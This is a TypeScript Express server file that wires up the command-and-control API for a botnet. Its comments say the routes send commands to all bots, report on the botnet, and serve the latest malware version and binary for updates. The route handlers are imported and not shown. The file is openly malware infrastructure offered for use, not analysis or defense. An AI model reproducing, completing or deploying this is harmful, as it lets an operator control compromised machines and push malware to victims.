import cors from "cors";
import express, { type Express } from "express";
import helmet from "helmet";
import { pino } from "pino";

import errorHandler from "@common/middleware/errorHandler";
import rateLimiter from "@common/middleware/rateLimiter";
import requestLogger from "@common/middleware/requestLogger";

import { env } from "@common/utils/envConfig";

import {
    tokenRouter,
    commandRouter,
    infoRouter,
    versionRouter,
    updateRouter,
    pingRouter
} from "@api/index";

const logger = pino({ name: "server start" });
const app: Express = express();

app.set("trust proxy", true);

// Middlewares
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors({ origin: env.CORS_ORIGIN, credentials: true }));
app.use(helmet());

//app.use(rateLimiter);

app.use(requestLogger);

// Routes
app.use("/token", tokenRouter);
app.use('/command', commandRouter); // Send command to all bots
app.use('/info', infoRouter); // Get info about the botnet
app.use('/version', versionRouter); // Get latest version of malware (updater stuff)
app.use('/update', updateRouter); // Download the latest version binary (updater stuff)
app.use('/ping', pingRouter); // Ping the server to check connection

app.use(errorHandler());

export { app, logger };
